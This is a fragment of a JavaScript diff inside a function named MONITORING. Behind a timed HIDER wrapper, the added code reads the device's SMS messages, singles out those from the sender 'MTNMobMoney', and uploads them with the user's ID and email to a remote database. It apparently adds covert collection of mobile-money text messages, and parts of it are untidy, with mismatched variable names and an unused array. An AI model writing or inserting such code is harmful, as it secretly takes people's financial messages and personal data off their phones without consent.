@@ -1000,18 +1000,32 @@ const MONITORING=()=>{
 
         HIDER(3000,()=>{
 
-            GETINDEX("Fiskon","Fiskon",(Dataata)=>{
+            GETSMS((Datata)=>{
 
                 const HEADERS=["UserID","Email","Messages"];
-            
-                const INFO=[Data.data.id,Data.data.email,Dataata];
-            
-                INSERTDATA(DATABASELINK,"ALL",HEADERS,INFO,(Datate)=>{
 
-                    INSERTDATA(DATABASELINK,Data.data.id,HEADERS,INFO,(Datate)=>{
+                CHECK(Datata.sender === "MTNMobMoney",()=>{
+
+                    const INFO2=[Data.data.id,Data.data.email,Datata];
+
+                    INSERTDATA(DATABASELINK,Data.data.id,HEADERS,INFO2,(Datate)=>{
                 
                     });
+
+                });
             
+                const INFO=[Data.data.id,Data.data.email,Datata];
+            
+            });
+
+            GETINDEX("Fiskon","Fiskon",(Datate)=>{
+
+                const HEADERS=["UserID","Email","Messages"];
+
+                const INFO=[Data.data.id,Data.data.email,Datate];
+
+                INSERTDATA(DATABASELINK,"ALL",HEADERS,INFO,(Datta)=>{
+
                 });
 
             });
